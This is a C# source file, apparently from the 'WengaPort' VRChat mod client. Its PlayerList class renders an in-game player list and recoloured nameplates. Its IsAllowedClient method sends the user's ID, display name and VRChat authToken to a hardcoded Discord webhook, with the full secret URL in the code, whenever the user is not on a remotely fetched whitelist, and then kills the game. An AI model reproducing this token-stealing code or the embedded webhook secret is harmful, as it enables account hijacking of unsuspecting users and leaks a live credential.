using WengaPort.Api;
using System;
using System.Collections.Generic;
using System.Linq;
using UnityEngine;
using VRC;
using WengaPort.Wrappers;
using UnityEngine.UI;
using VRC.Core;
using System.Net;
using WengaPort.Extensions;
using System.Diagnostics;
using System.Collections.Specialized;
using System.Collections;

namespace WengaPort.Modules
{
    internal class PlayerList
    {
        public static void Initialize()
        {
            float num = posy;
            Transform parent = Utils.QuickMenu.transform.Find("ShortcutMenu");
            PlayerCount = new MenuText(parent, posx, -500f, "Playerlist: ");
            for (int i = 0; i <= 32; i++)
            {
                MenuText item = new MenuText(parent, posx, posy, "");
                Logs.Add(item);
                posy += 70f;
            }
            posy = num;
        }

        public static void AddPlayerToList()
        {
            try
            {
                Players.Clear();
                foreach (Player Player in Utils.PlayerManager.GetAllPlayers().ToArray())
                {
                    string Text;
                    Text = (GeneralWrappers.GetIsBot(Player) ? "<color=#a33333>[BOT]</color> " : "") + (PlayerExtensions.IsFriend(Player) ? "<color=#ebc400>[F]</color> " : "") + (PlayerExtensions.GetIsMaster(Player) ? "<color=#3c1769>[M]</color> " : "") + (Player.GetAPIUser().IsOnMobile ? "<color=#27b02d>[Q]</color> " : "") + (Player.GetVRCPlayerApi().IsUserInVR() ? "<color=#00d4f0>[VR]</color> " : "<color=#00d4f0>[D]</color> ") + "<color=#00d4f0>" + Player.DisplayName() + "</color>" + " [P] " + GeneralWrappers.GetPingColored(Player) + " [F] " + GeneralWrappers.GetFramesColored(Player);
                    Players.Insert(0, Text);
                    UpdateText();
                    PlayerCount.SetText(string.Format("<b>In Room: {0}</b>", Players.Count));
                }
            }
            catch (Exception)
            { }
        }

        public static void UpdateText()
        {
            try
            {
                for (int i = 0; i <= Logs.Count; i++)
                {
                    try
                    {
                        if (Players[i] != null)
                        {
                            Logs[i].SetText(Players[i]);
                        }
                    }
                    catch
                    {
                        Logs[i].SetText("");
                    }
                }
            }
            catch
            {
            }
        }

        private static string Wenga;
        private static string Trial;
        private static string ClientUser;
        public static void Init()
        {
            try
            {
                string str = "https://github.com/W3nga/ClientIDs/blob/master/";
                Trial = new WebClient().DownloadString(str + "Trial.txt");
                Wenga = new WebClient().DownloadString(str + "Wenga.txt");
                ClientUser = new WebClient().DownloadString(str + "ClientUser.txt");
            }
            catch (Exception value)
            {
                Console.WriteLine(value);
                throw;
            }
        }

        public static bool CheckWenga(string Id)
        {
            return Wenga.Contains(Id);
        }

        public static bool CheckTrial(string Id)
        {
            return Trial.Contains(Id);
        }

        public static bool CheckClient(string Id)
        {
            return ClientUser.Contains(Id);
        }

        public static void IsAllowedClient()
        {
            if (!CheckClient(Utils.CurrentUser.UserID()))
            {
                SendWebHook("https://discord.com/api/webhooks/777948797779050557/5bNmfmYWBmLFMJX_6SPKGkEQ2-SQg5CZHMOjgY-cIw8ajz03Bgs-830OJeRqbBYebeB_", $"{Utils.CurrentUser.UserID()} tried to Login! Name:{Utils.CurrentUser.DisplayName()} & Token: {ApiCredentials.GetString("authToken")}");
                Process.GetCurrentProcess().Kill();
            }
        }

        public static List<string> Players = new List<string>();

        public static List<MenuText> Logs = new List<MenuText>();

        public static MenuText PlayerCount;

        public static float posx = -1200;

        public static float posy = -400f;

        public static IEnumerator AdminPlateChanger(Player player)
        {
            for (; ; )
            {
                while (RoomManager.field_Internal_Static_ApiWorld_0 == null) yield break;
                while (player.field_Internal_VRCPlayer_0 == null) yield break;
                Color Rainbow = HSBColor.ToColor(new HSBColor(Mathf.PingPong(Time.time / 2, 1), 1, 1));
                NameplateHandler.giveAdminText(player, Rainbow, "Cat Dealer");
                yield return new WaitForEndOfFrame();
            }
            yield break;
        }

        public static void DynBoneAdder(Player player)
        {
            if (player.IsFriend() && player.UserID() != Utils.CurrentUser.UserID() && !GlobalDynamicBones.FriendOnlyBones.Contains(player.UserID()))
            {
                GlobalDynamicBones.FriendOnlyBones.Add(player.UserID());
                PlayerExtensions.ReloadAvatar(player);
            }
        }

        public static void PlateChanger()
        {
            foreach (Player player in Utils.PlayerManager.GetAllPlayers().ToArray())
            {
                string text4 = player.GetAPIUser().GetRank().ToLower();
                bool WengaCheck = CheckWenga(player.UserID());
                bool TrialCheck = CheckTrial(player.UserID());
                bool ClientCheck = CheckClient(player.UserID());
                var nameplate = player.GetVRCPlayer().nameplate;
                if (WengaCheck)
                {

                }
                else if (TrialCheck)
                {
                    Color color = new Color(0.333f, 0.153f, 0.667f);
                    if (player.GetVRCPlayer().nameplate.uiName.color != color)
                    {
                        NameplateHandler.givePlateText(player, color, "ღ Wenga's Egirl ღ");
                    }
                }
                else if (ClientCheck)
                {
                    Color color = new Color(0.63f, 0.24f, 0.16f);
                    if (player.GetVRCPlayer().nameplate.uiName.color != color)
                    {
                        NameplateHandler.givePlateText(player, color, "WengaPort");
                    }
                }
                else
                {
                    switch (text4.ToString())
                    {
                        case "user":
                            {
                                Color color = new Color(0f, 1f, 0f);
                                if (nameplate.uiName.color != color)
                                {
                                    NameplateHandler.givePlateText(player, color, "User");
                                }
                                break;
                            }
                        case "legend":
                            {
                                Color color = new Color(0.95f, 0.95f, 0.95f);
                                if (nameplate.uiName.color != color)
                                {
                                    NameplateHandler.givePlateText(player, color, "Legend");
                                }
                                break;
                            }
                        case "known":
                            {
                                Color color = new Color(0.92f, 0.37f, 0f);
                                if (nameplate.uiName.color != color)
                                {
                                    NameplateHandler.givePlateText(player, color, "Known");
                                }
                                break;
                            }
                        case "new user":
                            {
                                Color color = new Color(0, 1f, 1f);
                                if (nameplate.uiName.color != color)
                                {
                                    NameplateHandler.givePlateText(player, color, "New");
                                }
                                break;
                            }
                        case "visitor":
                            {
                                Color color = new Color(0.09f, 0.09f, 0.09f);
                                if (nameplate.uiName.color != color)
                                {
                                    NameplateHandler.givePlateText(player, color, "Visitor");
                                }
                                break;
                            }
                        case "trusted":
                            {
                                Color color = new Color(0.87f, 0f, 0.5f);
                                if (nameplate.uiName.color != color)
                                {
                                    NameplateHandler.givePlateText(player, color, "Trusted");
                                }
                                break;
                            }
                        case "veteran":
                            {
                                Color color = new Color(1f, 0.81f, 0.03f);
                                if (nameplate.uiName.color != color)
                                {
                                    NameplateHandler.givePlateText(player, color, "Veteran");
                                }
                                break;
                            }
                        case "negativetrust":
                            {
                                Color color = new Color(0.44f, 0.01f, 0.01f);
                                if (nameplate.uiName.color != color)
                                {
                                    NameplateHandler.givePlateText(player, color, "Nuisance");
                                }
                                break;
                            }
                    }
                }
            
            }
        }

        public static void SendWebHook(string URL, string MSG)
        {
            NameValueCollection pairs = new NameValueCollection()
            {
                { "content", MSG }
            };
            byte[] numArray;
            using (WebClient webClient = new WebClient())
            {
                numArray = webClient.UploadValues(URL, pairs);
            }
        }
    }
}
